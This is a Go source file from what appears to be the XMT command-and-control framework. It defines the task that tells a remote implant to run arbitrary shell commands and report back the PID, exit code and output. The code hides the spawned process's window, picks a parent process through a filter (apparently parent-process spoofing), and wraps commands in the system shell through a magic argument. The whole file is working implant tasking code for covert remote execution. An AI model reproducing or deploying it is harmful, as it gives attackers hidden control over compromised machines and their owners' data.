package task

import (
	"bytes"
	"context"
	"io"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

// Process is a Tasklet that is similar to the 'cmd.Process' struct. This is
// used to Task a Client with running a specified command.
//
// This can be directly used in the Session 'Tasklet' function instead of
// directly creating a Task.
//
// The Filter attribute will attempt to set the target that runs the Process.
// If none are specified, the Process will be ran under the client process.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      Process struct {
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  <command...>
//  run <command...>
//  hup <command...>
//  shell <command...>
type Process struct {
	Filter *filter.Filter
	Dir    string

	Env, Args []string
	Stdin     []byte

	Timeout    time.Duration
	Flags      uint32
	Wait, Hide bool
}

// Run will create a Tasklet that will instruct the client to run a command.
// This command will parsed using the 'cmd.Split' function.
//
// The Filter attribute will attempt to set the target that runs the Process.
// If none are specified, the Process will be ran under the client process.
//
// The response to this task will return the PID, ExitCode and Stdout/Stderr
// data.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      Process struct {
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  <command...>
//  run <command...>
func Run(c string) Process {
	return Process{Args: cmd.Split(c), Wait: true}
}

// SetStdin wil attempt to read all the data from the supplied reader to fill
// the Stdin byte array for this Process struct.
//
// This function will return an error if any errors occurs during reading.
func (p *Process) SetStdin(r io.Reader) error {
	var err error
	p.Stdin, err = io.ReadAll(r)
	return err
}

// Packet will take the configured Process options and will return a Packet
// and any errors that may occur during building.
//
// This allows Process to fulfil the 'Tasklet' interface.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      Process struct {
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  <command...>
//  run <command...>
//  hup <command...>
//  shell <command...>
func (p Process) Packet() (*com.Packet, error) {
	n := &com.Packet{ID: TvExecute}
	p.MarshalStream(n)
	return n, nil
}

// MarshalStream writes the data for this Process to the supplied Writer.
func (p Process) MarshalStream(w data.Writer) error {
	if err := data.WriteStringList(w, p.Args); err != nil {
		return err
	}
	if err := w.WriteString(p.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Env); err != nil {
		return err
	}
	if err := w.WriteBool(p.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(p.Flags); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(p.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(p.Hide); err != nil {
		return err
	}
	if err := p.Filter.MarshalStream(w); err != nil {
		return err
	}
	if err := w.WriteBytes(p.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Process from the supplied Reader.
func (p *Process) UnmarshalStream(r data.Reader) error {
	if err := data.ReadStringList(r, &p.Args); err != nil {
		return err
	}
	if err := r.ReadString(&p.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &p.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&p.Flags); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&p.Timeout)); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Hide); err != nil {
		return err
	}
	if err := filter.UnmarshalStream(r, &p.Filter); err != nil {
		return err
	}
	if err := r.ReadBytes(&p.Stdin); err != nil {
		return err
	}
	return nil
}
func taskProcess(x context.Context, r data.Reader, w data.Writer) error {
	p, z, err := ProcessUnmarshal(x, r)
	if err != nil {
		return err
	}
	if z {
		w.WriteUint64(0)
		p.Stdout, p.Stderr = w, w
	}
	if err = p.Start(); err != nil {
		p.Stdout, p.Stderr = nil, nil
		return err
	}
	if p.Stdin = nil; !z {
		// NOTE(dij): Push PID 32bits higher, since exit code is zero anyway.
		w.WriteUint64(uint64(p.Pid()) << 32)
		p.Release()
		return nil
	}
	i := p.Pid()
	err = p.Wait()
	p.Stdout, p.Stderr = nil, nil
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = p.ExitCode()
		s    = w.(backer)
		//     ^ This should NEVER panic!
	)
	// NOTE(dij): The below is kinda super-hacky, and I hate it, but I really
	//            don't want to put in effort to make Seek work for Chunk
	//            writes *shrug*
	o := s.Payload()
	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
	return nil
}

// ProcessUnmarshal will read this Processes's struct data from the supplied
// reader and returns a Process runnable struct along with the wait boolean.
//
// This function returns an error if building or reading fails.
func ProcessUnmarshal(x context.Context, r data.Reader) (*cmd.Process, bool, error) {
	var p Process
	if err := p.UnmarshalStream(r); err != nil {
		return nil, false, err
	}
	if len(p.Args) == 0 {
		return nil, false, cmd.ErrEmptyCommand
	}
	v := cmd.NewProcessContext(x, p.Args...)
	if len(p.Args[0]) == 7 && p.Args[0][0] == '@' && p.Args[0][6] == '@' && p.Args[0][1] == 'S' && p.Args[0][5] == 'L' {
		v.Args = []string{device.Shell, device.ShellArgs, strings.Join(p.Args[1:], " ")}
	}
	if v.SetFlags(p.Flags); p.Hide {
		v.SetNoWindow(true)
		v.SetWindowDisplay(0)
	}
	if v.SetParent(p.Filter); len(p.Stdin) > 0 {
		v.Stdin = bytes.NewReader(p.Stdin)
	}
	v.Timeout, v.Dir, v.Env = p.Timeout, p.Dir, p.Env
	return v, p.Wait, nil
}
